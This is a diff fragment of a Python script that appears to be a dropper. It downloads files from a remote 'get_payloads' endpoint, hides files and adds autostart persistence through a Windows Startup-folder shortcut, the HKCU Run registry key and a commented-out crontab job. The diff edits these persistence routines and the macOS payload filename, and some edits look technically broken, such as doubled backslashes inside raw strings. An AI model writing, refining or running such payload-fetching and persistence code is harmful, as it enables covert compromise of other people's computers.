@@ -103,7 +103,7 @@ WantedBy=default.target""")
         create_hidden_file(directory)
     
     def add_to_startup(path, name):
-        startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
+        startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
         shortcut_path = os.path.join(startup_dir, f"{name}.lnk")
     
         with open(shortcut_path, 'w') as shortcut:
@@ -112,8 +112,8 @@ WantedBy=default.target""")
         return shortcut_path
     
     def add_registry_startup(path, name):
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{path}" /background')
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{path}" &')
         winreg.CloseKey(key)
      
     
@@ -154,7 +154,7 @@ WantedBy=default.target""")
         #add_crontab_job(file_path)
     
     elif os_type == 'Darwin':  # macOS
-        file_path = "./wow.exe"
+        file_path = "./wow"
         if not os.path.exists(file_path):
             response = requests.get(f"{url}get_payloads/{download_path}")
             with open(file_path, 'wb') as file:
